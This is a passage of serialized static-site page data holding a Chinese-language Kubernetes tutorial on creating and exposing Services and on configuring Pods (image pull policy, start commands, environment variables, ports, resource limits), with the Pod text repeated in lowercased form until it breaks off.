<none>        80/tcp    3m51s   run=nginx\n\n# 这里产生了一个cluster-ip，这就是service的ip，在service的生命周期中，这个地址是不会变动的\n# 可以通过这个ip访问当前service对应的pod\n[root@master ~]# curl 10.109.179.231:80\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n</head>\n<body>\n<h1>welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n操作二：创建集群外部也可访问的 service\n上面创建的 service 的 type 类型为 clusterip，这个 ip 地址只用集群内部可访问，如果需要创建外部也可以访问的 service，需要修改 type 为 nodeport\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=nodeport --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# 此时查看，会发现出现了nodeport类型的service，而且有一对port（80:31928/tc）\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nname          type        cluster-ip       external-ip   port(s)        age    selector\nsvc-nginx2    nodeport    10.100.94.0      <none>        80:31928/tcp   9s     run=nginx\n\n# 接下来就可以通过集群外的主机访问 节点ip:31928访问服务了\n# 例如在的电脑主机上通过浏览器访问下面的地址\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n删除 service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\n配置方式\n创建一个 svc-nginx.yaml，内容如下：\n\napiversion: v1\nkind: service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # 固定svc的内网ip，如果不指定会随机分配\n  clusterip: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: tcp\n    targetport: 80\n  selector:\n    run: nginx\n  type: clusterip\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f svc-nginx.yaml\n删除：kubectl delete -f svc-nginx.yaml',charsets:{cjk:!0}},{title:"kubernetes(五) Pod 介绍及配置",frontmatter:{title:"kubernetes(五) Pod 介绍及配置",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/604.kubernetes(%E4%BA%94)%20Pod%20%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%85%8D%E7%BD%AE.html",relativePath:"01.运维/60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.md",key:"v-668f65e8",path:"/kubernetes/604/",headers:[{level:2,title:"介绍",slug:"介绍",normalizedTitle:"介绍",charIndex:2},{level:3,title:"Pod结构",slug:"pod结构",normalizedTitle:"pod 结构",charIndex:9},{level:3,title:"Pod定义",slug:"pod定义",normalizedTitle:"pod 定义",charIndex:258},{level:2,title:"Pod配置",slug:"pod配置",normalizedTitle:"pod 配置",charIndex:5169},{level:3,title:"基本配置",slug:"基本配置",normalizedTitle:"基本配置",charIndex:5723},{level:3,title:"镜像拉取",slug:"镜像拉取",normalizedTitle:"镜像拉取",charIndex:5466},{level:3,title:"启动命令",slug:"启动命令",normalizedTitle:"启动命令",charIndex:714},{level:3,title:"环境变量",slug:"环境变量",normalizedTitle:"环境变量",charIndex:1216},{level:3,title:"端口设置",slug:"端口设置",normalizedTitle:"端口设置",charIndex:10966},{level:3,title:"资源配额",slug:"资源配额",normalizedTitle:"资源配额",charIndex:12205}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"介绍 Pod结构 Pod定义 Pod配置 基本配置 镜像拉取 启动命令 环境变量 端口设置 资源配额",content:'# 介绍\n\n\n# Pod 结构\n\n\n\n每个 Pod 中都可以包含一个或者多个容器，这些容器可以分为两类：\n\n * 用户程序所在的容器，数量可多可少\n * Pause 容器，这是每个 Pod 都会有的一个根容器，它的作用有两个：\n   * 可以以它为依据，评估整个 Pod 的健康状态\n   * 可以在根容器上设置 Ip 地址，其它容器都此 Ip（Pod IP），以实现 Pod 内部的网路通信\n     这里是Pod内部的通讯，Pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是Flannel\n\n\n# Pod 定义\n\n下面是 Pod 的资源清单：\n\napiVersion: v1     #必选，版本号，例如v1\nkind: Pod       　 #必选，资源类型，例如 Pod\nmetadata:       　 #必选，元数据\n  name: string     #必选，Pod名称\n  namespace: string  #Pod所属的命名空间,默认为"default"\n  labels:       　　  #自定义标签列表\n    - name: string      　          \nspec:  #必选，Pod中容器的详细定义\n  containers:  #必选，Pod中容器列表\n  - name: string   #必选，容器名称\n    image: string  #必选，容器的镜像名称\n    imagePullPolicy: [ Always|Never|IfNotPresent ]  #获取镜像的策略 \n    command: [string]   #容器的启动命令列表，如不指定，使用打包时使用的启动命令\n    args: [string]      #容器的启动命令参数列表\n    workingDir: string  #容器的工作目录\n    volumeMounts:       #挂载到容器内部的存储卷配置\n    - name: string      #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名\n      mountPath: string #存储卷在容器内mount的绝对路径，应少于512字符\n      readOnly: boolean #是否为只读模式\n    ports: #需要暴露的端口库号列表\n    - name: string        #端口的名称\n      containerPort: int  #容器需要监听的端口号\n      hostPort: int       #容器所在主机需要监听的端口号，默认与Container相同\n      protocol: string    #端口协议，支持TCP和UDP，默认TCP\n    env:   #容器运行前需设置的环境变量列表\n    - name: string  #环境变量名称\n      value: string #环境变量的值\n    resources: #资源限制和请求的设置\n      limits:  #资源限制的设置\n        cpu: string     #Cpu的限制，单位为core数，将用于docker run --cpu-shares参数\n        memory: string  #内存限制，单位可以为Mib/Gib，将用于docker run --memory参数\n      requests: #资源请求的设置\n        cpu: string    #Cpu请求，容器启动的初始可用数量\n        memory: string #内存请求,容器启动的初始可用数量\n    lifecycle: #生命周期钩子\n        postStart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\n        preStop: #容器终止前执行此钩子,无论结果如何,容器都会终止\n    livenessProbe:  #对Pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器\n      exec:       　 #对Pod容器内检查方式设置为exec方式\n        command: [string]  #exec方式需要制定的命令或脚本\n      httpGet:       #对Pod内个容器健康检查方法设置为HttpGet，需要制定Path、port\n        path: string\n        port: number\n        host: string\n        scheme: string\n        HttpHeaders:\n        - name: string\n          value: string\n      tcpSocket:     #对Pod内个容器健康检查方式设置为tcpSocket方式\n         port: number\n       initialDelaySeconds: 0       #容器启动完成后首次探测的时间，单位为秒\n       timeoutSeconds: 0    　　    #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒\n       periodSeconds: 0     　　    #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次\n       successThreshold: 0\n       failureThreshold: 0\n       securityContext:\n         privileged: false\n  restartPolicy: [Always | Never | OnFailure]  #Pod的重启策略\n  nodeName: <string> #设置NodeName表示将该Pod调度到指定到名称的node节点上\n  nodeSelector: obeject #设置NodeSelector表示将该Pod调度到包含这个label的node上\n  imagePullSecrets: #Pull镜像时使用的secret名称，以key：secretkey格式指定\n  - name: string\n  hostNetwork: false   #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络\n  volumes:   #在该pod上定义共享存储卷列表\n  - name: string    #共享存储卷名称 （volumes类型有很多种）\n    emptyDir: {}       #类型为emtyDir的存储卷，与Pod同生命周期的一个临时目录。为空值\n    hostPath: string   #类型为hostPath的存储卷，表示挂载Pod所在宿主机的目录\n      path: string      　　        #Pod所在宿主机的目录，将被用于同期中mount的目录\n    secret:       　　　#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configMap:         #类型为configMap的存储卷，挂载预定义的configMap对象到容器内部\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n不知道相关的 type 有什么资源类型可写，可以通过一个命令来查看每种资源的可配置项\n\n#   kubectl explain 资源类型         查看某种资源可以配置的一级属性\n#   kubectl explain 资源类型.属性     查看属性的子属性\n[root@k8s-master01 ~]# kubectl explain pod\nKIND:     Pod\nVERSION:  v1\nFIELDS:\n   apiVersion   <string>\n   kind <string>\n   metadata     <Object>\n   spec <Object>\n   status       <Object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nKIND:     Pod\nVERSION:  v1\nRESOURCE: metadata <Object>\nFIELDS:\n   annotations  <map[string]string>\n   clusterName  <string>\n   creationTimestamp    <string>\n   deletionGracePeriodSeconds   <integer>\n   deletionTimestamp    <string>\n   finalizers   <[]string>\n   generateName <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedFields        <[]Object>\n   name <string>\n   namespace    <string>\n   ownerReferences      <[]Object>\n   resourceVersion      <string>\n   selfLink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在 kubernetes 中基本所有资源的一级属性都是一样的，主要包含 5 部分：\n\n * apiVersion 版本，由 kubernetes 内部定义，版本号必须可以用 kubectl api-versions 查询到\n * kind 类型，由 kubernetes 内部定义，版本号必须可以用 kubectl api-resources 查询到\n * metadata 元数据，主要是资源标识和说明，常用的有 name、namespace、labels 等\n * spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述\n * status 状态信息，里面的内容不需要定义，由 kubernetes 自动生成\n\n在上面的属性中，spec 是接下来研究的重点，继续看下它的常见子属性:\n\n * containers <[] Object> 容器列表，用于定义容器的详细信息\n * nodeName 根据 nodeName 的值将 pod 调度到指定的 Node 节点上\n * nodeSelector <map []> 根据 NodeSelector 中定义的信息选择将该 Pod 调度到包含这些 label 的 Node 上\n * hostNetwork 是否使用主机网络模式，默认为 false，如果设置为 true，表示使用宿主机网络\n * volumes <[] Object> 存储卷，用于定义 Pod 上面挂在的存储信息\n * restartPolicy 重启策略，表示 Pod 在遇到故障的时候的处理策略\n\n\n# Pod 配置\n\n主要来研究 pod.spec.containers 属性，这也是 pod 配置中最为关键的一项配置。\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers\nKIND:     Pod\nVERSION:  v1\nRESOURCE: containers <[]Object>   # 数组，代表可以有多个容器\nFIELDS:\n   name  <string>     # 容器名称\n   image <string>     # 容器需要的镜像地址\n   imagePullPolicy  <string> # 镜像拉取策略 \n   command  <[]string> # 容器的启动命令列表，如不指定，使用打包时使用的启动命令\n   args     <[]string> # 容器的启动命令需要的参数列表\n   env      <[]Object> # 容器环境变量的配置\n   ports    <[]Object>     # 容器需要暴露的端口号列表\n   resources <Object>      # 资源限制和资源请求的设置\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 基本配置\n\n创建 pod-base.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-base\n  namespace: dev\n  labels:\n    user: heima\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n上面定义了一个比较简单 Pod 的配置，里面有两个容器：\n\n * nginx：用 1.17.1 版本的 nginx 镜像创建，（nginx 是一个轻量级 web 容器）\n * busybox：用 1.30 版本的 busybox 镜像创建，（busybox 是一个小巧的 linux 命令集合）\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl apply -f pod-base.yaml\npod/pod-base created\n\n# 查看Pod状况\n# READY 1/2 : 表示当前Pod中有2个容器，其中1个准备就绪，1个未就绪\n# RESTARTS  : 重启次数，因为有1个容器故障了，Pod一直在重启试图恢复它\n[root@k8s-master01 pod]# kubectl get pod -n dev\nNAME       READY   STATUS    RESTARTS   AGE\npod-base   1/2     Running   4          95s\n\n# 可以通过describe查看内部的详情\n# 此时已经运行起来了一个基本的Pod，所以它暂时有问题\n[root@k8s-master01 pod]# kubectl describe pod pod-base -n dev\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 镜像拉取\n\n当我们的 Pod 已经拉取镜像并启动容器，其他 Pod 也需要此镜像，那么此时其他 Pod 拉取相同镜像是从镜像源拉取，还是直接使用已经拉取过的镜像？这就由 imagepullpolicy 来决定。\n\n创建 pod-imagepullpolicy.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-imagepullpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    imagePullPolicy: Never # 用于设置镜像拉取策略\n  - name: busybox\n    image: busybox:1.30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nimagePullPolicy，用于设置镜像拉取策略，kubernetes 支持配置三种拉取策略：\n\n * Always：总是从远程仓库拉取镜像（一直远程下载）\n * IfNotPresent：本地有则使用本地镜像，本地没有则从远程仓库拉取镜像（本地有就本地 本地没远程下载）\n * Never：只使用本地镜像，从不去远程仓库拉取，本地没有就报错 （一直使用本地）\n\n> 默认值说明:\n> 如果镜像 tag 为具体版本号， 默认策略是：IfNotPresent\n> 如果镜像 tag 为：latest（最终版本） ，默认策略是 always\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl create -f pod-imagepullpolicy.yaml\npod/pod-imagepullpolicy created\n\n# 查看Pod详情\n# 此时明显可以看到nginx镜像有一步Pulling image "nginx:1.17.1"的过程\n[root@k8s-master01 pod]# kubectl describe pod pod-imagepullpolicy -n dev\n......\nEvents:\n  Type     Reason     Age               From               Message\n  ----     ------     ----              ----               -------\n  Normal   Scheduled  <unknown>         default-scheduler  Successfully assigned dev/pod-imagePullPolicy to node1\n  Normal   Pulling    32s               kubelet, node1     Pulling image "nginx:1.17.1"\n  Normal   Pulled     26s               kubelet, node1     Successfully pulled image "nginx:1.17.1"\n  Normal   Created    26s               kubelet, node1     Created container nginx\n  Normal   Started    25s               kubelet, node1     Started container nginx\n  Normal   Pulled     7s (x3 over 25s)  kubelet, node1     Container image "busybox:1.30" already present on machine\n  Normal   Created    7s (x3 over 25s)  kubelet, node1     Created container busybox\n  Normal   Started    7s (x3 over 25s)  kubelet, node1     Started container busybox\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 启动命令\n\n在 基本配置 的案例中，有一个问题没有解决，就是 busybox 容器一直没有成功运行，那么到底是什么原因导致这个容器的故障呢？\n\nbusybox 并不是一个程序，而是类似于一个工具类的集合，kubernetes 集群启动管理后，它会自动关闭。解决方法就是让其一直在运行，这就用到了 command 配置。\n\n创建 pod-command.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-command\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  - name: busybox\n    image: busybox:1.30\n    # 容器启动成功，执行死循环\n    command: ["/bin/sh","-c","touch /tmp/hello.txt;while true;do /bin/echo $(date +%T) >> /tmp/hello.txt; sleep 3; done;"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ncommand，用于在 pod 中的容器初始化完毕之后运行一个命令。\n\n> 稍微解释下上面命令的意思：\n> "/bin/sh","-c", 使用 sh 执行命令\n> touch /tmp/hello.txt; 创建一个 /tmp/hello.txt 文件\n> while true;do /bin/echo $(date +% T) >> /tmp/hello.txt; sleep 3; done; 每隔 3 秒向文件中写入当前时间\n\n# 创建Pod\n[root@k8s-master01 pod]# kubectl create  -f pod-command.yaml\npod/pod-command created\n\n# 查看Pod状态\n# 此时发现两个pod都正常运行了\n[root@k8s-master01 pod]# kubectl get pods pod-command -n dev\nNAME          READY   STATUS   RESTARTS   AGE\npod-command   2/2     Runing   0          2s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n进入 pod 中的 busybox 容器，查看文件内容，命令如下\n\nkubectl exec  pod名称 -n 命名空间 -it -c 容器名称 /bin/sh\n\n\n1\n\n\n使用这个命令就可以进入某个容器的内部，然后进行相关操作了，比如，可以查看 txt 文件的内容。演示：\n\n[root@k8s-master01 pod]# kubectl exec pod-command -n dev -it -c busybox /bin/sh\n/ # tail -f /tmp/hello.txt\n14:44:19\n14:44:22\n14:44:25\n\n\n1\n2\n3\n4\n5\n\n\n> 特别说明：\n> 通过上面发现 command 已经可以完成启动命令和传递参数的功能，为什么这里还要提供一个 args 选项，用于传递参数呢？这其实跟 docker 有点关系，kubernetes 中的 command、args 两项其实是实现覆盖 Dockerfile 中 ENTRYPOINT 的功能。\n> 1 如果 command 和 args 均没有写，那么用 Dockerfile 的配置。\n> 2 如果 command 写了，但 args 没有写，那么 Dockerfile 默认的配置会被忽略，执行输入的 command\n> 3 如果 command 没写，但 args 写了，那么 Dockerfile 中配置的 ENTRYPOINT 的命令会被执行，使用当前 args 的参数\n> 4 如果 command 和 args 都写了，那么 Dockerfile 的配置被忽略，执行 command 并追加上 args 参数\n\n\n# 环境变量\n\n创建 pod-env.yaml 文件，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-env\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do /bin/echo $(date +%T);sleep 60; done;"]\n    env: # 设置环境变量列表\n    - name: "username"\n      value: "admin"\n    - name: "password"\n      value: "123456"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nenv，环境变量，用于在 pod 中的容器设置环境变量。\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-env.yaml\npod/pod-env created\n\n# 进入容器，输出环境变量\n[root@k8s-master01 ~]# kubectl exec pod-env -n dev -c busybox -it /bin/sh\n/ # echo $username\nadmin\n/ # echo $password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n这种方式不是很推荐，推荐将这些配置单独存储在配置文件中，这种方式将在后面介绍。\n\n\n# 端口设置\n\n本小节来介绍容器的端口设置，也就是 containers 的 ports 选项。\n\n首先看下 ports 支持的子选项：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.ports\nKIND:     Pod\nVERSION:  v1\nRESOURCE: ports <[]Object>\nFIELDS:\n   name         <string>  # 端口名称，如果指定，必须保证name在pod中是唯一的\t\t\n   containerPort<integer> # 容器要监听的端口(0<x<65536)\n   hostPort     <integer> # 容器要在主机上公开的端口，如果设置，主机上只能运行容器的一个副本(一般省略) \n   hostIP       <string>  # 要将外部端口绑定到的主机IP(一般省略)\n   protocol     <string>  # 端口协议。必须是UDP、TCP或SCTP。默认为“TCP”。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n接下来，编写一个测试案例，创建 pod-ports.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-ports\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: # 设置容器暴露的端口列表\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-ports.yaml\npod/pod-ports created\n\n# 查看pod\n# 在下面可以明显看到配置信息\n[root@k8s-master01 ~]# kubectl get pod pod-ports -n dev -o yaml\n......\nspec:\n  containers:\n  - image: nginx:1.17.1\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      name: nginx-port\n      protocol: TCP\n......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n访问容器中的程序需要使用的是 podip:containerPort\n\n\n# 资源配额\n\n容器中的程序要运行，肯定是要占用一定资源的，比如 cpu 和内存等，如果不对某个容器的资源做限制，那么它就可能吃掉大量资源，导致其它容器无法运行。针对这种情况，kubernetes 提供了对内存和 cpu 的资源进行配额的机制，这种机制主要通过 resources 选项实现，他有两个子选项：\n\n * limits：用于限制运行时容器的最大占用资源，当容器占用资源超过 limits 时会被终止，并进行重启\n * requests ：用于设置容器需要的最小资源，如果环境资源不够，容器将无法启动\n\n可以通过上面两个选项设置资源的上下限。当配置了后，会自动去找合适的主机资源来启动 Pod\n\n接下来，编写一个测试案例，创建 pod-resources.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-resources\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    resources: # 资源配额\n      limits:  # 限制资源（上限）\n        cpu: "2" # CPU限制，单位是core数\n        memory: "10Gi" # 内存限制\n      requests: # 请求资源（下限）\n        cpu: "1"  # CPU限制，单位是core数\n        memory: "10Mi"  # 内存限制\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n在这对 cpu 和 memory 的单位做一个说明：\n\n * cpu：core 数，可以为整数或小数\n * memory： 内存大小，可以使用 Gi、Mi、G、M 等形式\n\n# 运行Pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看发现pod运行正常\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev\nNAME            READY   STATUS    RESTARTS   AGE  \npod-resources   1/1     Running   0          39s   \n\n# 接下来，停止Pod\n[root@k8s-master01 ~]# kubectl delete  -f pod-resources.yaml\npod "pod-resources" deleted\n\n# 编辑pod，修改resources.requests.memory的值为10Gi\n[root@k8s-master01 ~]# vim pod-resources.yaml\n\n# 再次启动pod\n[root@k8s-master01 ~]# kubectl create  -f pod-resources.yaml\npod/pod-resources created\n\n# 查看Pod状态，发现Pod启动失败\n[root@k8s-master01 ~]# kubectl get pod pod-resources -n dev -o wide\nNAME            READY   STATUS    RESTARTS   AGE          \npod-resources   0/1     Pending   0          20s    \n\n# 查看pod详情会发现，如下提示\n[root@k8s-master01 ~]# kubectl describe pod pod-resources -n dev\n......\nWarning  FailedScheduling  35s   default-scheduler  0/3 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn\'t tolerate, 2 Insufficient memory.(内存不足)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n',normalizedContent:'# 介绍\n\n\n# pod 结构\n\n\n\n每个 pod 中都可以包含一个或者多个容器，这些容器可以分为两类：\n\n * 用户程序所在的容器，数量可多可少\n * pause 容器，这是每个 pod 都会有的一个根容器，它的作用有两个：\n   * 可以以它为依据，评估整个 pod 的健康状态\n   * 可以在根容器上设置 ip 地址，其它容器都此 ip（pod ip），以实现 pod 内部的网路通信\n     这里是pod内部的通讯，pod的之间的通讯采用虚拟二层网络技术来实现，我们当前环境用的是flannel\n\n\n# pod 定义\n\n下面是 pod 的资源清单：\n\napiversion: v1     #必选，版本号，例如v1\nkind: pod       　 #必选，资源类型，例如 pod\nmetadata:       　 #必选，元数据\n  name: string     #必选，pod名称\n  namespace: string  #pod所属的命名空间,默认为"default"\n  labels:       　　  #自定义标签列表\n    - name: string      　          \nspec:  #必选，pod中容器的详细定义\n  containers:  #必选，pod中容器列表\n  - name: string   #必选，容器名称\n    image: string  #必选，容器的镜像名称\n    imagepullpolicy: [ always|never|ifnotpresent ]  #获取镜像的策略 \n    command: [string]   #容器的启动命令列表，如不指定，使用打包时使用的启动命令\n    args: [string]      #容器的启动命令参数列表\n    workingdir: string  #容器的工作目录\n    volumemounts:       #挂载到容器内部的存储卷配置\n    - name: string      #引用pod定义的共享存储卷的名称，需用volumes[]部分定义的的卷名\n      mountpath: string #存储卷在容器内mount的绝对路径，应少于512字符\n      readonly: boolean #是否为只读模式\n    ports: #需要暴露的端口库号列表\n    - name: string        #端口的名称\n      containerport: int  #容器需要监听的端口号\n      hostport: int       #容器所在主机需要监听的端口号，默认与container相同\n      protocol: string    #端口协议，支持tcp和udp，默认tcp\n    env:   #容器运行前需设置的环境变量列表\n    - name: string  #环境变量名称\n      value: string #环境变量的值\n    resources: #资源限制和请求的设置\n      limits:  #资源限制的设置\n        cpu: string     #cpu的限制，单位为core数，将用于docker run --cpu-shares参数\n        memory: string  #内存限制，单位可以为mib/gib，将用于docker run --memory参数\n      requests: #资源请求的设置\n        cpu: string    #cpu请求，容器启动的初始可用数量\n        memory: string #内存请求,容器启动的初始可用数量\n    lifecycle: #生命周期钩子\n        poststart: #容器启动后立即执行此钩子,如果执行失败,会根据重启策略进行重启\n        prestop: #容器终止前执行此钩子,无论结果如何,容器都会终止\n    livenessprobe:  #对pod内各容器健康检查的设置，当探测无响应几次后将自动重启该容器\n      exec:       　 #对pod容器内检查方式设置为exec方式\n        command: [string]  #exec方式需要制定的命令或脚本\n      httpget:       #对pod内个容器健康检查方法设置为httpget，需要制定path、port\n        path: string\n        port: number\n        host: string\n        scheme: string\n        httpheaders:\n        - name: string\n          value: string\n      tcpsocket:     #对pod内个容器健康检查方式设置为tcpsocket方式\n         port: number\n       initialdelayseconds: 0       #容器启动完成后首次探测的时间，单位为秒\n       timeoutseconds: 0    　　    #对容器健康检查探测等待响应的超时时间，单位秒，默认1秒\n       periodseconds: 0     　　    #对容器监控检查的定期探测时间设置，单位秒，默认10秒一次\n       successthreshold: 0\n       failurethreshold: 0\n       securitycontext:\n         privileged: false\n  restartpolicy: [always | never | onfailure]  #pod的重启策略\n  nodename: <string> #设置nodename表示将该pod调度到指定到名称的node节点上\n  nodeselector: obeject #设置nodeselector表示将该pod调度到包含这个label的node上\n  imagepullsecrets: #pull镜像时使用的secret名称，以key：secretkey格式指定\n  - name: string\n  hostnetwork: false   #是否使用主机网络模式，默认为false，如果设置为true，表示使用宿主机网络\n  volumes:   #在该pod上定义共享存储卷列表\n  - name: string    #共享存储卷名称 （volumes类型有很多种）\n    emptydir: {}       #类型为emtydir的存储卷，与pod同生命周期的一个临时目录。为空值\n    hostpath: string   #类型为hostpath的存储卷，表示挂载pod所在宿主机的目录\n      path: string      　　        #pod所在宿主机的目录，将被用于同期中mount的目录\n    secret:       　　　#类型为secret的存储卷，挂载集群与定义的secret对象到容器内部\n      scretname: string  \n      items:     \n      - key: string\n        path: string\n    configmap:         #类型为configmap的存储卷，挂载预定义的configmap对象到容器内部\n      name: string\n      items:\n      - key: string\n        path: string\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n不知道相关的 type 有什么资源类型可写，可以通过一个命令来查看每种资源的可配置项\n\n#   kubectl explain 资源类型         查看某种资源可以配置的一级属性\n#   kubectl explain 资源类型.属性     查看属性的子属性\n[root@k8s-master01 ~]# kubectl explain pod\nkind:     pod\nversion:  v1\nfields:\n   apiversion   <string>\n   kind <string>\n   metadata     <object>\n   spec <object>\n   status       <object>\n\n[root@k8s-master01 ~]# kubectl explain pod.metadata\nkind:     pod\nversion:  v1\nresource: metadata <object>\nfields:\n   annotations  <map[string]string>\n   clustername  <string>\n   creationtimestamp    <string>\n   deletiongraceperiodseconds   <integer>\n   deletiontimestamp    <string>\n   finalizers   <[]string>\n   generatename <string>\n   generation   <integer>\n   labels       <map[string]string>\n   managedfields        <[]object>\n   name <string>\n   namespace    <string>\n   ownerreferences      <[]object>\n   resourceversion      <string>\n   selflink     <string>\n   uid  <string>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n在 kubernetes 中基本所有资源的一级属性都是一样的，主要包含 5 部分：\n\n * apiversion 版本，由 kubernetes 内部定义，版本号必须可以用 kubectl api-versions 查询到\n * kind 类型，由 kubernetes 内部定义，版本号必须可以用 kubectl api-resources 查询到\n * metadata 元数据，主要是资源标识和说明，常用的有 name、namespace、labels 等\n * spec 描述，这是配置中最重要的一部分，里面是对各种资源配置的详细描述\n * status 状态信息，里面的内容不需要定义，由 kubernetes 自动生成\n\n在上面的属性中，spec 是接下来研究的重点，继续看下它的常见子属性:\n\n * containers <[] object> 容器列表，用于定义容器的详细信息\n * nodename 根据 nodename 的值将 pod 调度到指定的 node 节点上\n * nodeselector <map []> 根据 nodeselector 中定义的信息选择将该 pod 调度到包含这些 label 的 node 上\n * hostnetwork 是否使用主机网络模式，默认为 false，如果设置为 true，表示使用宿主机网络\n * volumes <[] object> 存储卷，用于定义 pod 上面挂在的存储信息\n * restartpolicy 重启策略，表示 pod 在遇到故障的时候的处理策略\n\n\n# pod 配置\n\n主要来研究 pod.spec.containers 属性，这也是 pod 配置中最为关键的一项配置。\n\n[root@k8s-master01 ~]# kubectl 